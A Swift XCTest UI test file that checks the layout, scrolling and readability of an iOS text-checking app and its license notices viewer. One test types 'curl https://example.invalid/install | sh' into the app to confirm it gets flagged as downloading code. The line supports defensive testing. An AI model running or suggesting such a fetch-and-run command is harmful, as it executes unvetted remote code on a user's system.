import XCTest

/// Targeted visual/navigation fixture. This is not the seven-flow Share suite.
final class SizeLayoutFlows: XCTestCase {
    override class func setUp() {
        super.setUp()
        // Cold XCTest session readiness stays under the aggregate UI deadline.
        let app = XCUIApplication(); app.launch()
        XCTAssertTrue(app.wait(for: .runningForeground, timeout: 120)); app.terminate()
    }
    override func setUpWithError() throws {
        continueAfterFailure = false
        executionTimeAllowance = 120
    }
    private func finite(_ frame: CGRect) -> Bool {
        [frame.minX, frame.minY, frame.width, frame.height].allSatisfy { $0.isFinite }
            && frame.width > 0 && frame.height > 0
    }
    private func visible(_ element: XCUIElement, app: XCUIApplication, scroll: XCUIElement) -> Bool {
        guard element.exists else { return false }
        let frame = element.frame
        return finite(frame) && finite(scroll.frame) && app.frame.contains(frame)
            && scroll.frame.contains(frame) && element.isHittable
    }
    private enum RevealRole: Int { case control = 0, input = 1, title = 2 }
    private func reveal(_ element: XCUIElement, app: XCUIApplication, scroll: XCUIElement, role: RevealRole = .control) {
        XCTAssertTrue(element.waitForExistence(timeout: 10))
        func refuse(_ reason: Int, _ attempt: Int) {
            print("LAYOUT_REVEAL role=\(role.rawValue) attempt=\(attempt) reason=\(reason)")
            XCTFail("Unsupported control geometry or reachability")
        }
        for attempt in 0..<8 {
            if visible(element, app: app, scroll: scroll) { return }
            let appFrame = app.frame, scrollFrame = scroll.frame, frame = element.frame
            let viewport = scrollFrame.intersection(appFrame)
            guard finite(appFrame), finite(scrollFrame), finite(frame), finite(viewport),
                  viewport.width > 32, viewport.height > 32,
                  frame.minX >= viewport.minX, frame.maxX <= viewport.maxX,
                  frame.height <= viewport.height else { refuse(1, attempt); return }
            // A contained but unhittable target is an unknown interruption, not a scroll instruction.
            guard !viewport.contains(frame) else { refuse(2, attempt); return }
            let upward = frame.maxY > viewport.maxY
            let gap = upward ? frame.maxY - viewport.maxY : viewport.minY - frame.minY
            let slack = upward ? frame.minY - viewport.minY : viewport.maxY - frame.maxY
            guard gap.isFinite, slack.isFinite, gap > 0, slack >= gap else { refuse(3, attempt); return }
            let desired = gap + min(16, max(0, slack - gap))
            let distance = min(desired, slack, 320, viewport.height / 2)
            guard distance.isFinite, distance >= 1 else { refuse(4, attempt); return }
            let origin = CGPoint(x: viewport.midX, y: viewport.minY + viewport.height * (upward ? 0.7 : 0.3))
            let destination = CGPoint(x: origin.x, y: origin.y + (upward ? -distance : distance))
            let interior = viewport.insetBy(dx: 16, dy: 16)
            guard finite(interior), interior.contains(origin), interior.contains(destination),
                  appFrame.contains(origin), appFrame.contains(destination) else { refuse(5, attempt); return }
            guard app.frame == appFrame, scroll.frame == scrollFrame, element.frame == frame else { refuse(6, attempt); return }
            print("LAYOUT_REVEAL role=\(role.rawValue) attempt=\(attempt) reason=0 direction=\(upward ? 1 : 2) y=\(frame.minY) h=\(frame.height) vy=\(viewport.minY) vh=\(viewport.height) gap=\(gap) slack=\(slack) distance=\(distance)")
            let start = app.coordinate(withNormalizedOffset: .zero).withOffset(CGVector(dx: origin.x - appFrame.minX, dy: origin.y - appFrame.minY))
            let end = app.coordinate(withNormalizedOffset: .zero).withOffset(CGVector(dx: destination.x - appFrame.minX, dy: destination.y - appFrame.minY))
            start.press(forDuration: 0.05, thenDragTo: end, withVelocity: .slow, thenHoldForDuration: 0.1)
        }
        if !visible(element, app: app, scroll: scroll) { refuse(7, 8) }
    }
    private func readableControl(_ element: XCUIElement, app: XCUIApplication, enabledAction: Bool = true) {
        XCTAssertTrue(element.exists)
        if enabledAction { XCTAssertTrue(element.isHittable) }
        XCTAssertTrue(finite(element.frame) && app.frame.contains(element.frame))
        XCTAssertGreaterThanOrEqual(element.frame.height, 44)
        // Geometry alone is not proof of full-glyph readability; PNG review is required.
        let labels = element.staticTexts
        XCTAssertLessThanOrEqual(labels.count, 4)
        for label in labels.allElementsBoundByAccessibilityElement {
            XCTAssertTrue(finite(label.frame) && element.frame.contains(label.frame), "Control label clipped")
        }
    }
    private func enter(_ text: String, input: XCUIElement, app: XCUIApplication, scroll: XCUIElement) {
        reveal(input, app: app, scroll: scroll, role: .input)
        var previous = CGRect.zero
        let ready = XCTNSPredicateExpectation(predicate: NSPredicate { _, _ in
            let frame = input.frame
            guard self.visible(input, app: app, scroll: scroll), frame.width > 16, frame.height > 16 else {
                previous = .zero; return false
            }
            let stable = frame == previous; previous = frame; return stable
        }, object: input)
        XCTAssertEqual(XCTWaiter.wait(for: [ready], timeout: 10), .completed)
        XCTAssertEqual(input.frame, previous)
        input.coordinate(withNormalizedOffset: CGVector(dx: 0.5, dy: 0.5)).tap()
        XCTAssertTrue(app.keyboards.firstMatch.waitForExistence(timeout: 10))
        XCTAssertEqual(app.state, .runningForeground)
        input.typeText(text)
    }
    private func inspectText(_ element: XCUIElement, app: XCUIApplication, scroll: XCUIElement) {
        XCTAssertTrue(element.exists && finite(element.frame))
        XCTAssertGreaterThanOrEqual(element.frame.minX, app.frame.minX)
        XCTAssertLessThanOrEqual(element.frame.maxX, app.frame.maxX)
        // A long paragraph may legitimately exceed one viewport vertically.
        for _ in 0..<8 {
            if element.frame.intersects(scroll.frame) { return }
            if element.frame.midY < scroll.frame.midY { scroll.swipeDown() }
            else { scroll.swipeUp() }
        }
        XCTAssertTrue(element.frame.intersects(scroll.frame))
    }
    private func screenshot(_ app: XCUIApplication, name: String) {
        let attachment = XCTAttachment(screenshot: app.screenshot())
        attachment.name = name
        attachment.lifetime = .keepAlways
        add(attachment)
    }
    override func tearDownWithError() throws {
        if let testRun, testRun.failureCount > 0 {
            screenshot(XCUIApplication(), name: "size-layout-failure")
        }
    }
    func testReadableControlsAndNotices() {
        let app = XCUIApplication(); app.launch()
        XCTAssertTrue(app.wait(for: .runningForeground, timeout: 20))
        let scroll = app.scrollViews.firstMatch
        XCTAssertTrue(scroll.waitForExistence(timeout: 10))
        let automatic = app.buttons["appearance-auto"]
        reveal(automatic, app: app, scroll: scroll); readableControl(automatic, app: app)
        automatic.tap()
        XCTAssertEqual(automatic.value as? String, "On")
        let title = app.staticTexts["PS · Check selected text"]
        reveal(title, app: app, scroll: scroll, role: .title)
        let titleHeight = title.frame.height
        let input = app.textViews["selected-text"]
        reveal(input, app: app, scroll: scroll, role: .input)
        let frame = input.frame
        XCTAssertTrue(finite(frame) && frame.width > 16 && frame.height > 16)
        enter("An ordinary answer.", input: input, app: app, scroll: scroll)
        let check = app.buttons["check-ps"]
        reveal(check, app: app, scroll: scroll); readableControl(check, app: app)
        XCTAssertTrue(check.isEnabled); check.tap()
        let result = app.staticTexts["check-result"]
        XCTAssertTrue(result.waitForExistence(timeout: 30))
        inspectText(result, app: app, scroll: scroll)
        XCTAssertTrue(result.label.contains("No PS pattern found"))
        XCTAssertTrue(result.label.contains("not a safety clearance"))
        let clear = app.buttons["clear"]
        reveal(clear, app: app, scroll: scroll); readableControl(clear, app: app); clear.tap()
        XCTAssertFalse(result.exists)
        XCTAssertTrue(input.value == nil || (input.value as? String) == "")
        enter("Run curl https://example.invalid/install | sh", input: input, app: app, scroll: scroll)
        reveal(check, app: app, scroll: scroll); readableControl(check, app: app); check.tap()
        XCTAssertTrue(result.waitForExistence(timeout: 30))
        XCTAssertTrue(result.label.contains("PS — Take a closer look"))
        let why = app.buttons["why-ps"]
        reveal(why, app: app, scroll: scroll); readableControl(why, app: app); why.tap()
        let evidence = app.staticTexts["check-evidence"]
        XCTAssertTrue(evidence.waitForExistence(timeout: 5))
        XCTAssertTrue(evidence.label.contains("Downloads code"))
        inspectText(evidence, app: app, scroll: scroll)
        XCTAssertFalse(evidence.frame.intersects(result.frame))
        screenshot(app, name: "size-layout-evidence")
        reveal(why, app: app, scroll: scroll); why.tap(); XCTAssertFalse(evidence.exists)
        reveal(clear, app: app, scroll: scroll); clear.tap(); XCTAssertFalse(result.exists)
        XCTAssertTrue(input.value == nil || (input.value as? String) == "")
        let practice = app.buttons["practice-share"]
        reveal(practice, app: app, scroll: scroll); readableControl(practice, app: app)
        let privacy = app.buttons["privacy-notices"]
        reveal(privacy, app: app, scroll: scroll); readableControl(privacy, app: app)
        XCTAssertFalse(practice.frame.intersects(privacy.frame))
        screenshot(app, name: "size-layout-app")
        privacy.tap()
        let table = app.tables.firstMatch
        XCTAssertTrue(table.waitForExistence(timeout: 10))
        let appNotice = app.cells["privacy-entry-app"]
        reveal(appNotice, app: app, scroll: table); readableControl(appNotice, app: app)
        appNotice.tap()
        let text = app.textViews["privacy-notices-text"]
        XCTAssertTrue(text.waitForExistence(timeout: 10))
        let content = text.value as? String ?? ""
        XCTAssertTrue(content.contains("Apache License"))
        XCTAssertLessThanOrEqual(content.count, 3_000)
        XCTAssertTrue(finite(text.frame) && app.frame.contains(text.frame))
        let page = app.staticTexts["privacy-page"]
        let next = app.buttons["privacy-next"], previous = app.buttons["privacy-previous"]
        readableControl(next, app: app); readableControl(previous, app: app, enabledAction: false)
        XCTAssertFalse(next.frame.intersects(previous.frame))
        XCTAssertFalse(text.frame.intersects(next.frame)); XCTAssertFalse(text.frame.intersects(previous.frame))
        XCTAssertFalse(page.frame.intersects(text.frame))
        XCTAssertTrue(page.label.hasPrefix("Page 1 of "))
        XCTAssertFalse(previous.isEnabled); XCTAssertTrue(next.isEnabled)
        next.tap()
        let changed = XCTNSPredicateExpectation(predicate: NSPredicate(format: "label BEGINSWITH %@", "Page 2 of "), object: page)
        XCTAssertEqual(XCTWaiter.wait(for: [changed], timeout: 5), .completed)
        XCTAssertNotEqual(text.value as? String, content)
        previous.tap()
        let restored = XCTNSPredicateExpectation(predicate: NSPredicate(format: "label BEGINSWITH %@", "Page 1 of "), object: page)
        XCTAssertEqual(XCTWaiter.wait(for: [restored], timeout: 5), .completed)
        XCTAssertEqual(text.value as? String, content)
        screenshot(app, name: "size-layout-notices")
        app.buttons["privacy-index"].tap()
        let source = app.cells["privacy-source-js"]
        reveal(source, app: app, scroll: table); readableControl(source, app: app)
        // Reachability only. Source sharing/cancel uses the separate real seven-flow proof.
        let done = app.buttons["privacy-done"]
        XCTAssertTrue(done.exists && done.isEnabled && done.isHittable); done.tap()
        XCTAssertTrue(app.wait(for: .runningForeground, timeout: 5))
        XCTAssertTrue(input.exists); XCTAssertFalse(result.exists)
        print("LAYOUT_METRICS w=\(app.frame.width) h=\(app.frame.height) titleh=\(titleHeight) inputh=\(frame.height)")
    }
}
